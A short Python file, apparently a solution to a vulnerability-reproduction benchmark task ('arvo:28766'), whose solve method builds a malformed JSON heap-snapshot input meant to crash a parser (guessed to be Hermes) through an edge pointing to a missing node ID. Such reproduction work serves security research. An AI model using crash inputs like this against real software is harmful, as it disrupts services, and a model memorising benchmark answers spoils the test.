import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability (arvo:28766) corresponds to an issue in memory snapshot parsing (likely Hermes)
        # where the parser fails to validate that a node index referenced by an edge resolves to a Node ID 
        # that exists in the `node_id_map`. This results in dereferencing an invalid iterator (`end()`).
        
        # To trigger the stack/heap overflow or crash:
        # 1. Create a minimal valid snapshot structure.
        # 2. Define `node_fields` to have minimal stride (1).
        # 3. Provide a `nodes` array with valid data for 1 node, plus extra data.
        # 4. Set `node_count` to 1, so only the first node (ID 1) is added to the map.
        # 5. Define an edge pointing to the index of the extra data (value 2).
        # 6. The parser reads ID 2, fails to find it in the map, and dereferencing the result causes the crash.
        
        poc = {
            "snapshot": {
                "meta": {
                    "node_fields": ["id"],
                    "edge_fields": ["to_node"]
                },
                "node_count": 1,
                "edge_count": 1
            },
            "nodes": [1, 2],
            "edges": [1],
            "strings": []
        }
        
        return json.dumps(poc, separators=(',', ':')).encode('utf-8')